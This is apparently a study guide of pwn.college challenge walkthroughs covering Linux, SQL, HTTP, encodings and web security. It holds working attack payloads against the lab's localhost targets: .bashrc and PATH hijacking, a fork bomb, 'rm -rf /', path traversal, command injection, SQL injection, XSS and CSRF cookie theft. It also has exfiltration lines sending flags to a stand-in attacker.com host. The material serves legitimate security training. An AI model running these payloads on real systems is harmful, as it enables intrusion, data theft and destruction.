# 🎓 pwn.college COMPLETE Learning Playbook (All Topics)

A fully comprehensive, modular guide covering **every topic** from Modules 1–5. Each topic includes concept, example, and key insight.

---

# 📚 MODULE 1: Start Hacking (Linux) — 15 Topics

## 🗺️ Module 1 Overview

```
   ┌──────────────────────────────────────────────────┐
   │  1. Pondering Paths        │  9. Untangling Users│
   │  2. Comprehending Commands │ 10. Perceiving Perms│
   │  3. Documentation          │ 11. Chaining Commds │
   │  4. File Globbing          │ 12. Terminal Multipx│
   │  5. Practicing Piping      │ 13. Pondering PATH  │
   │  6. Shell Variables        │ 14. Shenanigans     │
   │  7. Data Manipulation      │ 15. Daring Destruct │
   │  8. Processes & Jobs       │                     │
   └──────────────────────────────────────────────────┘
```

---

## 1.1 Pondering Paths

**Concept:** Linux is a tree at `/`. Paths are absolute (`/...`) or relative (depend on CWD).

**Key commands:**
```bash
cd /usr/share/zoneinfo/posix/Asia && /challenge/run
cd /challenge && ./run          # NOT 'run' (bare name)
challenge  →  bare name = NO CWD lookup
```

**Traps:**
| Trap | Fix |
|------|-----|
| `cd /challenge/run` (file, not dir) | `cd /challenge && ./run` |
| `run` from `/challenge` fails | `./run` or `/challenge/run` |
| `~` not expanded by program | Only expanded by shell |

**Key insight:** `/` always wins; `./` forces CWD lookup.

---

## 1.2 Comprehending Commands

**Concept:** Core view/manipulate tools.

| Command | Purpose |
|---------|---------|
| `cat file` | View file |
| `grep pat file` | Search pattern |
| `diff a b` | Compare files |
| `touch file` | Create file |
| `rm file` | Delete file |
| `cp src dst` | Copy |
| `mv src dst` | Move/rename |
| `ls -a` | Show hidden |
| `ls -l` | Show permissions |
| `find / -name flag` | Find file |
| `mkdir dir` | Create dir |
| `ln -s /flag link` | Symlink |
| `ln /flag hard` | Hard link |

**Key insight:** `ls -la` is your best friend — always check hidden files + permissions.

---

## 1.3 Documentation

**Concept:** Self-documenting tools.

```bash
man challenge                 # full manual
man -k challenge              # search man pages
/challenge/challenge --help   # quick usage
help cd                       # bash builtin
```

**man navigation:** `↑↓` scroll, `/pat` search forward, `?pat` backward, `n`/`N` next/prev, `q` quit.

**Key insight:** Stuck? `man` → `--help` → `help` → source code.

---

## 1.4 File Globbing

**Concept:** Shell expands wildcards **before** the command runs.

| Glob | Matches |
|------|---------|
| `*` | Any chars (0+) |
| `?` | One char |
| `[abc]` | a, b, or c |
| `[a-z]` | Range |
| `[!ab]` | NOT a or b |

**Examples:**
```bash
cd /ch*                          # /challenge
cd /?ha??enge                    # /challenge
/challenge/run file_[bash]       # file_b, file_a, file_s, file_h
/challenge/run [!pwn]*           # NOT starting with p, w, n
/challenge/run [cep]*            # starts with c, e, p
```

**Trap:** No match → glob left as-is (`nope_*` stays `nope_*`).

**Key insight:** Shell does globbing, not the program.

---

## 1.5 Practicing Piping

**Concept:** Pipes connect stdout → stdin.

### 🗺️ File Descriptors

```
   stdin(0) ──▶ [PROG] ──▶ stdout(1)
                       └─▶ stderr(2)
```

| Operator | Effect |
|----------|--------|
| `>` | Redirect stdout (overwrite) |
| `>>` | Redirect stdout (append) |
| `<` | Redirect stdin |
| `2>` | Redirect stderr |
| `2>&1` | stderr → stdout |
| `\|` | Pipe |
| `<(...)` | Process substitution |
| `>(...)` | Reverse process substitution |

### Commands
```bash
/challenge/run > myflag
/challenge/run > out.log 2> err.log
/challenge/run < PWN
/challenge/run | grep pwn.college
/challenge/run 2>&1 | grep pwn.college
/challenge/run | grep -v DECOY
/challenge/run | sed 's/FAKEFLAG//g'
/challenge/pwn | tee intercepted | /challenge/college
diff <(/challenge/print_decoys) <(/challenge/print_decoys_and_flag)
/challenge/hack | tee >(/challenge/the) >(/challenge/planet)
/challenge/hack 2> >(/challenge/the) | /challenge/planet
mkfifo /tmp/flag_fifo
/challenge/run > /tmp/flag_fifo & cat /tmp/flag_fifo
```

**Key insight:** `>` overwrites, `>>` appends. `2>&1` merges errors into output.

---

## 1.6 Shell Variables

**Concept:** `export` = share with children.

### 🗺️ Scope

```
   Parent Shell              Child Process
   ┌──────────┐              ┌──────────┐
   │ A=1      │───fork()────▶│ A  ✗     │
   │ export B │              │ B  ✓     │
   └──────────┘              └──────────┘
```

```bash
PWN=COLLEGE                    # local
PWN="COLLEGE YEAH"             # multi-word
export PWN=COLLEGE             # exported
COLLEGE=PWN                    # local only
echo $PWN

FLAG=$(cat /flag)              # capture output
PWN=$(/challenge/run)

read PWN                       # read from stdin
read PWN < /challenge/read_me  # read from file
env | grep FLAG                # dump exported
```

**Key insight:** `export` promotes to environment variable; without it, child processes can't see it.

---

## 1.7 Data Manipulation

**Concept:** Transform text streams.

| Command | Purpose | Example |
|---------|---------|---------|
| `tr` | Translate | `tr 'A-Za-z' 'a-zA-Z'` |
| `tr -d` | Delete | `tr -d '^%'` |
| `head -n N` | First N | `head -n 7` |
| `tail` | Last 10 | `tail` |
| `cut -d ' ' -f 2` | Column 2 | `cut -d ' ' -f 2` |
| `sort` | Sort lines | `sort file.txt` |

```bash
/challenge/run | tr 'A-Za-z' 'a-zA-Z'    # flip case
/challenge/run | tr -d '^%'              # delete decoys
/challenge/run | tr -d '\n'              # remove newlines
/challenge/pwn | head -n 7 | /challenge/college
/challenge/run | cut -d " " -f 2 | tr -d "\n"
sort /challenge/flags.txt | tail
```

**Key insight:** Each tool does one thing; chain them with pipes.

---

## 1.8 Processes & Jobs

**Concept:** Every running program is a process with a PID.

| Command | Purpose |
|---------|---------|
| `ps -ef` | All processes |
| `ps aux` / `auxww` | All + no truncate |
| `kill PID` | Kill |
| `kill -9 PID` | Force kill |
| `cmd &` | Background |
| `Ctrl+Z` | Suspend |
| `fg` | Foreground |
| `bg` | Background |
| `jobs` | List jobs |

```bash
ps -ef | grep challenge
ps -ef | grep dont_run
kill <PID>
kill <PID>; cat /tmp/flag_fifo & /challenge/run
```

**Key insight:** `ps aux` is your window into everything running.

---

## 1.9 Untangling Users

**Concept:** Linux has users, groups, and password hashes.

### 🗺️ User Files

```
   /etc/passwd  →  name:UID:GID:info:home:shell   (world-readable)
   /etc/shadow  →  password hashes                (root-only)
```

```bash
su                    # switch to root (needs password)
su zardus             # switch to zardus
sudo cat /flag        # run as root
john /challenge/shadow-leak    # crack hashes → aardvark
```

**Key insight:** `su` switches users (needs password); `sudo` runs specific commands as root (needs sudoers entry).

---

## 1.10 Perceiving Permissions

**Concept:** 9 permission bits (3 users × 3 actions).

### 🗺️ Permission Bits

```
   -rwxr-xr-x
    │└┬┘└┬┘└┬┘
    │ │  │  └── others
    │ │  └───── group
    │ └──────── owner
    └────────── type
   
   Values: r=4  w=2  x=1
   rwx = 7, r-x = 5, r-- = 4
```

| Command | Purpose |
|---------|---------|
| `chmod a+r /flag` | Add read all |
| `chmod u+s /challenge/getroot` | Set SUID |
| `chmod 400 /flag` | Set numeric mode |
| `chown hacker /flag` | Change owner |
| `chgrp hacker /flag` | Change group |
| `id` | Show UID/GIDs |
| `ls -l` | Show permissions |

### 🗺️ SUID

```
   Normal:  hacker runs file → runs as hacker
   SUID:    hacker runs file → runs as root (owner)
```

```bash
chmod u+s /challenge/getroot
/challenge/getroot
cat /flag
```

**Key insight:** SUID = run with file owner's privileges. Primary privilege escalation vector.

---

## 1.11 Chaining Commands

**Concept:** Combine commands with `;`, `&&`, `||`, or scripts.

### 🗺️ Chaining Operators

```
   ;   → always run next
   &&  → run next only on SUCCESS
   ||  → run next only on FAILURE
   |   → pipe
```

```bash
/challenge/pwn; /challenge/college
/challenge/first-success && /challenge/second
/challenge/first-failure || /challenge/second
```

### 🗺️ Scripting

**Basic script:**
```bash
#!/bin/bash
/challenge/pwn
/challenge/college
```
```bash
bash script.sh
bash script.sh | /challenge/solve
```

**With arguments:**
```bash
#!/bin/bash
echo "$2 $1"                 # $1, $2, $@, $0
```
```bash
chmod a+x solve.sh
./solve.sh apple banana
```

**With conditionals:**
```bash
#!/bin/bash
if [ "$1" == "pwn" ]; then
    echo "college"
elif [ "$1" == "hack" ]; then
    echo "the planet"
else
    echo "unknown"
fi
```

**Reading unknown script:**
```bash
file /challenge/run          # ASCII text? ELF?
cat /challenge/run
echo "hack the PLANET" | /challenge/run
```

**Key insight:** `#!/bin/bash` (shebang) enables `./script.sh`.

---

## 1.12 Terminal Multiplexing

**Concept:** Detach sessions that survive disconnects.

| Feature | screen | tmux |
|---------|--------|------|
| Prefix | `Ctrl-A` | `Ctrl-B` |
| Detach | `Ctrl-A d` | `Ctrl-B d` |
| List | `screen -ls` | `tmux ls` |
| Attach | `screen -r` | `tmux a` |
| New window | `Ctrl-A c` | `Ctrl-B c` |
| Next | `Ctrl-A n` | `Ctrl-B n` |
| Prev | `Ctrl-A p` | `Ctrl-B p` |
| Window N | `Ctrl-A N` | `Ctrl-B N` |

**Key insight:** Multiplexers keep sessions alive across disconnects.

---

## 1.13 Pondering PATH

**Concept:** Shell searches directories in `$PATH` for bare command names.

### 🗺️ Resolution

```
   Typed: ls
        │
        ▼
   Search $PATH dirs in order:
   /usr/local/sbin, /usr/local/bin, /usr/sbin,
   /usr/bin, /sbin, /bin  ← found
        │
        ▼
   Run /bin/ls
```

### 🗺️ PATH Hijacking

```
   Normal:  $PATH=/usr/bin:/bin
            run calls 'rm' → /bin/rm
            
   Hijack:  $PATH=/home/hacker
            run calls 'rm' → /home/hacker/rm (YOUR script)
```

```bash
PATH=""                     # disable
PATH=/challenge/more_commands/
PATH=/home/hacker

# Hijack 'win'
echo "/bin/cat /flag" > /home/hacker/win
chmod +x /home/hacker/win
PATH=/home/hacker; /challenge/run

# Hijack 'rm'
echo "/bin/cat /flag" > /home/hacker/rm
chmod +x /home/hacker/rm
PATH=/home/hacker; /challenge/run
```

**Key insight:** PATH order matters — first match wins.

---

## 1.14 Shenanigans

**Concept:** Attack other users via startup files.

### 🗺️ .bashrc Flow

```
   zardus logs in → bash reads ~/.bashrc → runs contents
                                            │
                                    attacker wrote → runs as zardus
```

**Attack 1 — Direct injection:**
```bash
echo "cat /flag" >> /home/zardus/.bashrc
/challenge/victim
```

**Attack 2 — PATH hijack:**
```bash
echo 'read FLAG' > /home/hacker/flag_checker
echo 'echo "Captured: $FLAG"' >> /home/hacker/flag_checker
chmod +x /home/hacker/flag_checker
echo 'export PATH=/home/hacker:$PATH' >> /home/zardus/.bashrc
/challenge/victim
```

**Attack 3 — Symlink swap:**
```bash
rm /home/zardus/.bashrc
cp /home/hacker/.bashrc /home/zardus/.bashrc
/challenge/victim
```

**Attack 4 — Process sniffing:**
```bash
while true; do ps aux | grep zardus | grep -v grep; sleep 0.1; done
# find: --password SECRET
su zardus
sudo cat /flag
```

**Attack 5 — Config reading:**
```bash
cat /home/zardus/.bashrc
# find: FLAG_GETTER_API_KEY=sk-1965714851
flag_getter --key sk-1965714851
```

**Key insight:** Startup files are code — write access = code execution as that user.

---

## 1.15 Daring Destruction

**Concept:** Destroy system state to trigger flag release, then recover.

### 🗺️ Fork Bomb

```
   spawn 2 → each spawns 2 → exponential
   process table exhausted → system stalls
```

```bash
echo '#!/bin/bash' > bomb.sh
echo './bomb.sh & ./bomb.sh &' >> bomb.sh
chmod +x bomb.sh
./bomb.sh
```

### 🗺️ Disk Exhaustion

```
   yes > big_junk_file  → fills quota
   rm big_junk_file     → restore
```

```bash
yes > big_junk_file
# wait for "No space left on device"
/challenge/check
rm big_junk_file
/challenge/check
```

### 🗺️ rm -rf / + Recovery

```
   rm -rf / --no-preserve-root
        │
        ▼
   disk deleted BUT bash is in RAM
        │
        ▼
   bash builtins still work (read, echo, cd)
```

```bash
rm -rf / --no-preserve-root
read -r FLAG < /flag
echo $FLAG
```

**Key insight:** Bash builtins survive deletion — `read`, `echo`, `cd`, `export` are in memory.

---

# 📚 MODULE 2: SQL Queries — 10 Topics

## 🗺️ SQL Anatomy

```
   SELECT  columns       ← WHAT
   FROM    table         ← WHERE FROM
   WHERE   condition     ← WHICH rows
   LIMIT   n             ← HOW MANY
```

## 💻 All 10 Solutions

| # | Challenge | Solution |
|---|-----------|----------|
| 2.1 | Basic | `SELECT * FROM assets;` |
| 2.2 | Filtering | `SELECT secret FROM details WHERE flag_tag = 1337;` |
| 2.3 | Columns | `SELECT info FROM details WHERE flag_tag = 1337;` |
| 2.4 | Exclusionary | `SELECT flag FROM flags WHERE flag_tag != 1;` |
| 2.5 | String filter | `SELECT secret FROM data WHERE flag_tag = 'yep';` |
| 2.6 | Expression filter | `SELECT * FROM fragments WHERE SUBSTR(record,1,1)='p';` |
| 2.7 | Select expr | `SELECT SUBSTR(value,1,4) FROM archive WHERE SUBSTR(value,1,3)="pwn";` |
| 2.8 | Composite | `SELECT text FROM storage WHERE flag_tag = 1337 LIMIT 1;` |
| 2.9 | Limits | `SELECT blob FROM payloads WHERE SUBSTR(blob,1,3)="pwn" LIMIT 1;` |
| 2.10 | Metadata | `SELECT tbl_name FROM sqlite_master;` → then `SELECT detail FROM <tbl>;` |

## 🗺️ sqlite_master

```
   ┌──────────┬──────────┬──────────┐
   │  type    │  name    │  sql     │
   ├──────────┼──────────┼──────────┤
   │  table   │  users   │ CREATE.. │
   │  index   │  idx_1   │ CREATE.. │
   │  view    │  v_flags │ CREATE.. │
   └──────────┴──────────┴──────────┘
```

**Key insight:** `sqlite_master` reveals schema — always step 1.

---

# 📚 MODULE 3: Talking Web (HTTP) — Full Coverage

## 🗺️ HTTP Anatomy

```
   REQUEST:
   POST /pwn HTTP/1.1
   Host: challenge.localhost:80
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 11
   Cookie: session=abc
   
   param=value
   
   RESPONSE:
   HTTP/1.1 200 OK
   Content-Length: 1234
   Set-Cookie: session=xyz
   
   <html>...</html>
```

## 💻 All HTTP Challenges (Grouped)

### 🗺️ Group A — Discovery

| # | Challenge | Command |
|---|-----------|---------|
| 3.1 | First HTTP | `curl --user-agent "Firefox" http://challenge.localhost:80/pwn` |
| 3.2 | Reading Flask | `curl --user-agent "Firefox" http://challenge.localhost:80/pwn` |
| 3.3 | Commented Data | `curl --user-agent "Firefox" http://challenge.localhost:80/pwn` |
| 3.4 | HTTP Metadata | `curl -v http://challenge.localhost:80/pwn` |

### 🗺️ Group B — netcat vs curl vs python

| # | Challenge | Command |
|---|-----------|---------|
| 3.5 | netcat / | `echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" \| nc challenge.localhost 80` |
| 3.6 | netcat /hack | `echo -ne "GET /hack HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" \| nc ...` |
| 3.7 | curl /trial | `curl http://challenge.localhost:80/trial` |
| 3.8 | python /trial | `requests.get(...)` |

### 🗺️ Group C — Host Header

| # | Challenge | Command |
|---|-----------|---------|
| 3.9 | python | `requests.get(url, headers={'Host': 'challenge.localhost'})` |
| 3.10 | curl | `curl --header "Host: challenge.localhost" http://challenge.localhost` |
| 3.11 | netcat | `echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" \| nc ...` |

### 🗺️ Group D — URL Encoding

| # | Challenge | Command |
|---|-----------|---------|
| 3.12 | netcat | `echo -ne "GET /hack%20the%20planet HTTP/1.1\r\nHost: ...\r\n\r\n" \| nc ...` |

**URL encoding key:** `%20` = space, `%2F` = `/`, `%3B` = `;`

### 🗺️ Group E — GET Parameters

| # | Challenge | Command |
|---|-----------|---------|
| 3.13 | Basic | `curl "http://challenge.localhost:80/endpoint?key=value"` |
| 3.14 | Multiple (nc) | `echo -ne "GET /path?p1=v1&p2=v2 HTTP/1.1\r\n..."` |
| 3.15 | Multiple (curl) | `curl "http://challenge.localhost:80/path?p1=v1&p2=v2"` |
| 3.35 | Multiple (js) | `fetch('http://.../submission?auth_key=...&access=...')` |

**Trap:** quote the URL (`&` is a shell operator).

### 🗺️ Group F — POST Forms

| # | Challenge | Command |
|---|-----------|---------|
| 3.16 | Forms | `curl -X POST -d "p=v" http://.../endpoint` |
| 3.17 | Forms (curl) | Same as 3.16 |
| 3.18 | Forms (netcat) | See below |
| 3.19 | Forms (python) | `requests.post(url, data={'p':'v'})` |
| 3.20 | Without Forms | Same as 3.16 |
| 3.21 | Without Forms (curl) | Same as 3.16 |
| 3.22 | Without Forms (netcat) | Same as 3.18 |
| 3.36 | Forms (js) | `fetch(url, {method:'POST', body:new URLSearchParams({...})})` |

**netcat POST pattern:**
```bash
echo -ne "POST /endpoint HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nparameter=value" | nc challenge.localhost 80
```
**MUST include `Content-Length` and `Content-Type`.**

### 🗺️ Group G — Redirects

| # | Challenge | Command |
|---|-----------|---------|
| 3.23 | Redirects (nc) | Read `302 FOUND` + `Location:` then `GET <location>` |
| 3.24 | Redirects (curl) | `curl -L http://.../` |
| 3.25 | Redirects (python) | `requests.get(url)` (auto-follows) |
| 3.31 | Speaking Redirects | Write 302 redirect server (see below) |
| 3.32 | JS Redirects | `<script>window.location.href='.../fulfill';</script>` |

### 🗺️ Group H — Cookies

| # | Challenge | Command |
|---|-----------|---------|
| 3.26 | Cookies (curl) | `curl http://localhost:80 -v` → extract cookie → `curl --cookie "name=value" http://localhost:80` |
| 3.27 | Cookies (netcat) | Send GET → read `Set-Cookie:` → resend with `Cookie: name=value` header |
| 3.28 | Cookies (python) | `requests.get(url)` (auto-cookie jar) |
| 3.29 | Server State (python) | `requests.get(url)` |

### 🗺️ Group I — Client-Side / Listening

| # | Challenge | Command |
|---|-----------|---------|
| 3.30 | Listening Web | `nc -l -p 1337 -v` (receive request) |
| 3.33 | Including JavaScript | `<script src='http://challenge.localhost:80/solve'></script>` then use `flag` variable |
| 3.34 | HTTP JavaScript | `fetch('.../submit').then(r=>r.text()).then(c=>window.location.href='/path/solve.html'+c)` |

**Speaking Redirects (3.31) — redirect.py:**
```python
import socket
s = socket.socket(); s.bind(('0.0.0.0', 1337)); s.listen(5)
while True:
    conn, _ = s.accept()
    conn.recv(1024)
    conn.sendall(b"HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost:80/attempt\r\nContent-Length: 0\r\n\r\n")
    conn.close()
```

**Including JS (3.33) — solve.html:**
```html
<script src='http://challenge.localhost:80/solve'></script>
<script>
  window.location.href='/home/hacker/public_html/solve.html' + flag;
</script>
```

### 🗺️ Curl Flag Cheat Sheet

| Flag | Purpose |
|------|---------|
| `-X POST` | POST method |
| `-d "k=v"` | Form data |
| `-H "H: v"` | Custom header |
| `-b "k=v"` | Send cookie |
| `-c file` | Save cookies |
| `-L` | Follow redirects |
| `-v` | Verbose |
| `--user-agent "Firefox"` | Set UA |

**Key insight:** HTTP = method + path + headers + body. Craft each one.

---

# 📚 MODULE 4: Dealing with Data (Encodings) — 19 Topics

## 🗺️ Encoding Pipeline

```
   Text ──encode──▶ Bytes ──program──▶ Compare
                     ▲
                     │
                decode (reverse)
```

## 💻 All 19 Topics

| # | Challenge | Command |
|---|-----------|---------|
| 4.1 | What's the Password? | `cat /challenge/runme` → find password → `echo "pw" \| /challenge/runme` |
| 4.2 | ...and again? | Same |
| 4.3 | Newline Troubles | `echo -n "pw" \| /challenge/runme` |
| 4.4 | Reasoning about files | `echo -n "pw" > /tmp/ryoy; /challenge/runme` |
| 4.5 | Specifying Filenames | `echo -n "pw" > /tmp/in; /challenge/runme /tmp/in` |
| 4.6 | Binary & Hex | `echo -n "68656c6c6f" \| /challenge/runme` |
| 4.7 | More Hex | `echo -n "6368616c6c656e6765" \| /challenge/runme` |
| 4.8 | Decoding Hex | `echo -e -n "\x48\x65\x6c\x6c\x6f" > /tmp/in; /challenge/runme` |
| 4.9 | Decoding Practice | `echo -e -n "\x98\xd3\xd0\xb2\xce\xe1\xee\xab" \| /challenge/runme` |
| 4.10 | Encoding Practice | Python: `"".join(format(b,'08b') for b in bytes)` → feed binary |
| 4.11 | Hex ASCII | `gdb -q; p/x "eewqcnzx"` → `echo -n "65657771636e7a78" \| /challenge/runme` |
| 4.12 | Nested Encoding | `a.hex().encode().hex().encode().hex().encode().hex()` (4× for 4 decodes) |
| 4.13 | UTF-8 Hex | `"📊 🚔 🔦 🕞".encode()` → `f09f938a20f09f9a9420f09f94a620f09f959e` |
| 4.14 | UTF Mixups | UTF-16 LE: interleave `\x00` after each byte: `\x6d\x00\x70\x00...` |
| 4.15 | Modifying Encoded Data | Reverse the hex string then feed |
| 4.16 | Decoding Base64 | `base64.b64decode(b'rFSn2eTJLic=')` → raw bytes → feed |
| 4.17 | Encoding Base64 | `base64.b64encode(b'\x83...')` → `gzLbxMXQqoo=` → feed |
| 4.18 | Obfuscation | Copy script, print `correct_password`, feed it |
| 4.19 | Obfuscation 2 | Reverse + `b64encode` twice |

## 🗺️ The `\x` Trap

```
   echo "\x48"       →  \x48  (4 chars)
   echo -e "\x48"    →  H     (1 byte)
   echo -n "\x48"    →  \x48  (no newline, no interp)
   echo -e -n "\x48" →  H     (1 byte, no newline)
```

## 🗺️ UTF-16 LE Encoding

```
   Char 'A' (U+0041):
   UTF-16 LE:  41 00   (low byte, high byte)
   
   Char '📊' (U+1F4CA):
   UTF-16 LE:  3C D8 CA DF  (low surrogate, high surrogate)
```

## 🗺️ UTF-8 Encoding

```
   Char 'A':  41
   Char '📊': F0 9F 93 8A  (4 bytes)
   Space:     20
```

**Key insight:** Trace the data path. What transformation? Reverse it.

---

# 📚 MODULE 5: Web Security — Full Coverage

## 🗺️ Attack Taxonomy

```
   App ──▶ Filesystem → Path Traversal
   App ──▶ Shell      → Command Injection
   App ──▶ Database   → SQL Injection (Union / Blind)
   App ──▶ Browser    → XSS (Stored / Reflected)
   Browser ─▶ Server  → CSRF
   App ──▶ Client     → Auth Bypass (URL / Cookie)
```

---

## 5.1 Path Traversal

**Concept:** `../` escapes the intended directory.

```
   /challenge/files/../../../etc/passwd
        │            │││
        │            ││└─ /challenge
        │            │└── /
        │            └─── /
        └──────────────── /challenge/files
   = /etc/passwd
```

```bash
curl --path-as-is "http://challenge.localhost:80/package/../../../etc/passwd"
curl --path-as-is "http://challenge.localhost:80/package/../../../flag"
```

**Key insight:** `--path-as-is` is required — curl normalizes `../` by default.

---

## 5.2 Command Injection

**Concept:** Shell metacharacters escape into `shell=True`.

### 🗺️ Metacharacters

| Char | Meaning | URL Encoded |
|------|---------|-------------|
| `;` | Sequential | `%3B` |
| `&&` | AND | `%26%26` |
| `\|\|` | OR | `%7C%7C` |
| `\|` | Pipe | `%7C` |
| `&` | Background | `%26` |
| `\n` | Newline | `%0A` |
| `` ` `` | Subshell | `%60` |
| `$()` | Subshell | `%24%28%29` |

```bash
curl "http://challenge.localhost:80/?target=;cat%20/flag"
curl "http://challenge.localhost:80/?target=&&cat%20/flag"
curl "http://challenge.localhost:80/?target=%0Acat%20/flag"
curl "http://challenge.localhost:80/?target=%7Ccat%20/flag"
```

### 🗺️ Filter Bypass

```
   Filter: ; → ""
   Bypass: && || | \n & $( ) ` `
```

### 🗺️ Blind Injection

| Technique | Payload |
|-----------|---------|
| Time | `; sleep 5` |
| Web write | `; cat /flag > /var/www/html/flag.txt` |
| DNS | `; nslookup $(cat /flag \| base64).attacker.com` |
| HTTP | `; curl -d "$(cat /flag)" http://attacker.com/collect` |

**Key insight:** `shell=True` + user input = RCE. Use `subprocess.run([...])`.

---

## 5.3 Authentication Bypass — URL Param

```python
username = flask.request.args.get("session_user")
if username == "admin": show_flag()
```

```bash
curl "http://challenge.localhost:80/?session_user=admin"
```

**Key insight:** Trusting URL params = auth bypass.

---

## 5.4 Authentication Bypass — Cookie

```python
username = flask.request.cookies.get("session_user")
if username == "admin": show_flag()
```

```bash
curl -b "session_user=admin" "http://challenge.localhost:80/"
```

**Key insight:** Unsigned cookies = forgeable.

---

## 5.5 SQL Injection — Basic Auth Bypass

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 🗺️ Injection Flow

```
   user = "admin' --"
   password = "anything"
        │
        ▼
   SELECT * FROM users 
   WHERE username = 'admin' --' AND password = 'anything'
        │
   -- comments out rest
        ▼
   SELECT * FROM users WHERE username = 'admin'
        │
        ▼
   Returns admin → login succeeds
```

```bash
curl -X POST "http://challenge.localhost:80/login" \
  -d "user=admin' --" -d "password=anything"

curl -X POST "http://challenge.localhost:80/login" \
  -d "user=admin' OR '1'='1" -d "password=anything"
```

**Key insight:** `--` comments out the password check.

---

## 5.6 SQL Injection — UNION (Chaining)

```python
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```

### 🗺️ UNION Stacking

```
   Query 1:  SELECT username FROM users WHERE username = "admin"
                → "admin"
   
   UNION
   
   Query 2:  SELECT password FROM users WHERE username = "admin"
                → "FLAG{...}"
   
   Result:
     admin
     FLAG{...}
```

```bash
# Get flag (admin password)
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT password FROM users WHERE username="admin" --'

# Get schema
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT sql FROM sqlite_master --'

# Get tables
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT name FROM sqlite_master WHERE type="table" --'

# Get all users
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT username || ":" || password FROM users --'
```

**Key insight:** UNION stacks extra SELECTs.

---

## 5.7 Blind SQL Injection — Boolean

```python
user = db.execute(query).fetchone()
if not user: abort(403)  # else 302 redirect
```

### 🗺️ Oracle

```
   True  → 302 (redirect)
   False → 403 (error)
```

### 🗺️ Character Loop

```python
flag = ""
for pos in range(1, 100):
    for c in "abcdef..._{}":
        payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') = '{c}' --"
        r = requests.post(url, data={'username': 'admin', 'password': payload})
        if r.status_code == 302:
            flag += c
            break
```

```bash
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'p' --"
```

**Key insight:** Boolean oracles extract one character at a time.

---

## 5.8 Blind SQL Injection — Time-Based

```bash
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT CASE WHEN SUBSTR(password,1,1)='p' THEN 1 ELSE 0 END) = 1 AND sleep(5) --"
```

**Key insight:** Delay = true; fast = false.

---

## 5.9 XSS — Stored (Basic)

```python
page += "<hr>" + post["content"] + "\n"   # UNSAFE
```

```bash
# Inject textboxes
curl -X POST "http://challenge.localhost:80/" -d "content=<input type='text'><input type='text'>"
/challenge/victim "http://challenge.localhost:80/"
```

**Key insight:** Raw HTML concatenation = XSS.

---

## 5.10 XSS — Reflected (Body)

```python
return f"...{flask.request.args.get('msg')}..."
```

```bash
/challenge/victim "http://challenge.localhost:80/?msg=<script>alert(1)</script>"
```

**Key insight:** Reflection without escaping = XSS.

---

## 5.11 XSS — Reflected (Textarea Breakout)

```python
<textarea name=msg>{msg}</textarea>
```

```bash
/challenge/victim "http://challenge.localhost:80/?msg=</textarea><script>alert('PWNED')</script>"
```

**Key insight:** Close the textarea first, then inject.

---

## 5.12 XSS — Stored with CSRF (xss5)

```python
# Admin's draft has flag
# GET /publish → publishes admin's draft
```

```bash
curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337"
curl -b cookie.txt -X POST http://challenge.localhost:80/draft \
  -d 'content=<script>fetch("/publish");</script>&publish=on'
/challenge/victim
curl -b cookie.txt http://challenge.localhost:80/ | grep -o "pwn.college{[^}]*}"
```

**Key insight:** XSS as admin → forge admin action.

---

## 5.13 XSS — Stored with POST CSRF (xss6)

```bash
curl -b cookie.txt -X POST http://challenge.localhost:80/draft \
  -d 'content=<script>
fetch("/publish", {method:"POST"}).then(()=>fetch("/")).then(r=>r.text()).then(h=>{
  const f=h.match(/pwn\.college\{[^}]+\}/); if(f)fetch("http://localhost:1337/",{method:"POST",body:f[0]});
});
</script>&publish=on'
/challenge/victim
```

**Key insight:** POST method for `/publish`, exfil full flag from HTML.

---

## 5.14 XSS — Steal Admin Cookie (xss7)

```python
response.set_cookie('auth', username+"|"+password, httponly=True)
```

```bash
# Step 1: Exfil page HTML (cookie is HttpOnly)
curl -b cookie.txt -X POST http://challenge.localhost:80/draft \
  -d 'content=<script>fetch("/").then(r=>r.text()).then(h=>{
    fetch("http://localhost:1337/",{method:"POST",body:h});
  });</script>&publish=on'
/challenge/victim

# Step 2: Read flag from captured HTML
```

**Key insight:** HttpOnly = can't read `document.cookie`; use `fetch()` to get page HTML.

---

## 5.15 CSRF — Basic (csrf1)

```python
# /publish endpoint publishes admin's draft
```

**Attack site (`index.html` on 1337):**
```html
<script>window.location = "http://challenge.localhost:80/publish";</script>
```
```bash
python3 -m http.server 1337
/challenge/victim http://hacker.localhost:1337/
```

**Key insight:** Full-page navigation sends cookies.

---

## 5.16 CSRF — POST (csrf2)

```bash
# Redirect alone doesn't POST; need form auto-submit
<form id="f" action="http://challenge.localhost:80/publish" method="POST"></form>
<script>document.getElementById('f').submit();</script>
```

**Key insight:** Auto-submit forms for POST CSRF.

---

## 5.17 CSRF — XSS Chain (csrf3)

```html
<script>window.location = 'http://challenge.localhost:80/ephemeral?msg=<script>alert("PWNED");fetch("/publish",{method:"POST"});</script>';</script>
```

**Key insight:** Reflected XSS in `/ephemeral` → CSRF.

---

## 5.18 CSRF — Cookie Steal (csrf4)

```bash
# Steal admin auth cookie via XSS
fetch("http://localhost:1338/?cookie=" + encodeURIComponent(document.cookie))
```

**Key insight:** Same-origin XSS exfiltrates cookies to attacker listener.

---

## 5.19 CSRF — HttpOnly Cookie (csrf5)

```python
response.set_cookie('auth', ..., httponly=True)
```

```bash
# Bind 31337 to impersonate server port
curl -b cookie.txt -X POST http://challenge.localhost:80/draft \
  -d 'content=<body onload="fetch(\'http://localhost:1338/?steal=1\', {credentials:\'include\'})">&publish=on'
```

